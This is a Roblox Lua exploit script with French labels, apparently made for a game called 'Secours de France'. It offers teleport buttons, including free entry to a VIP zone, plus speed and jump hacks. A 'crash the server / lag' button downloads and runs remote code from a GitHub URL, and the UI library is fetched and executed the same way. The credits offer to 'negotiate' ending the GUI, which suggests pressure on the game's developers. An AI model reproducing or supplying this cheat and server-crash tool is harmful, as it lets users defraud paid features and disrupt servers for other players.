------------------ Desoler au staff etc mais je m'ennuyer et une partie des script vien pas de moi 
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Secours de france @lobox920", "Serpent")

----- Teleportation -----
local Tab = Window:NewTab("Teleprtation")

local Section = Tab:NewSection("Option de teleportation")

Section:NewButton("Spawn", "Se teleporter au Spawn", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9.00982475, 5.70808744, -1791.53821, 0.104770258, -2.0917069e-08, 0.994496465, -4.58966269e-08, 1, 2.58680366e-08, -0.994496465, -4.83542344e-08, 0.104770258)
end)

Section:NewButton("Zone VIP", "Se teleporter a la Zone VIP", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-653.971191, 5.05000257, -1498.21655, -0.9967767, -4.07623126e-08, 0.0802259967, -4.45098962e-08, 1, -4.49244872e-08, -0.0802259967, -4.83505325e-08, -0.9967767)
end)
Section:NewButton("Concessionnaire", "Se teleporter au concessonaire", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(197.858688, 5.23999929, -1468.34961, -0.999903142, -5.9146501e-08, -0.0139166778, -5.95280234e-08, 1, 2.70005174e-08, 0.0139166778, 2.7826335e-08, -0.999903142)
end)

Section:NewButton("Hopitale", "Se teleporter a l'hopitale", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-113.240608, 5.29852343, -572.987061, -0.999908864, 8.75139339e-09, 0.0135009987, 7.55577556e-09, 1, -8.86087577e-08, -0.0135009987, -8.84986662e-08, -0.999908864)
end)

Section:NewButton("Vinci Auroroute", "Se teleporter a Vinci Autoroute", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-161.287979, 5.13203573, 799.438171, -0.997737885, -1.27863737e-08, 0.0672241822, -1.30895135e-08, 1, -4.06892164e-09, -0.0672241822, -4.93964913e-09, -0.997737885)
end)

Section:NewButton("Gendarmerie", "Se teleporter a la Gendarmerie", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(716.885376, 5.83151722, 185.371399, -0.0315530524, -4.24012114e-08, -0.999502063, -5.52302524e-08, 1, -4.06787848e-08, 0.999502063, 5.39192122e-08, -0.0315530524)
end)

Section:NewButton("Sapeur Pompier", "Se teleporter a la Carserne des Pompier", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1404.99915, 5.68864489, 325.429932, -0.99734354, -8.74559447e-08, -0.0728412718, -8.96470809e-08, 1, 2.68115556e-08, 0.0728412718, 3.32703394e-08, -0.99734354)
end)

----- Zone VIP -----
local Tab = Window:NewTab("Zone VIP")
local Section = Tab:NewSection("Vip gratuit ??")

Section:NewButton("Se tp a la zone VIP", "Se teleporter a la Zone VIP", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-653.971191, 5.05000257, -1498.21655, -0.9967767, -4.07623126e-08, 0.0802259967, -4.45098962e-08, 1, -4.49244872e-08, -0.0802259967, -4.83505325e-08, -0.9967767)
end)

local Tab = Window:NewTab("Autre")
local Section = Tab:NewSection("Autre")

Section:NewSlider("Speedhack", "Change la vitesse du joueur", 250, 16, function(v) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
end)
Section:NewSlider("Jump power", "Change la force de saut du joueur", 500, 50, function(v) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = v
end)

Section:NewButton("Crash le serveur / lag", "Crash le serveur / le faire lag", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/lobox920/RBLXScript/main/ACS_explode_all.lua')))()
end)

------------------------- CREDITS -------------------------
local Tab = Window:NewTab("Credits")
local Section = Tab:NewSection("Fait par lobox920")
local Section = Tab:NewSection("Ouver a toute negociation d'arret du GUI :)")
local Section = Tab:NewSection("Mon discord : https://discord.gg/g2rmfEtvaj")
local Section = Tab:NewSection("Discord de SF: https://discord.gg/UnZVumd23t")
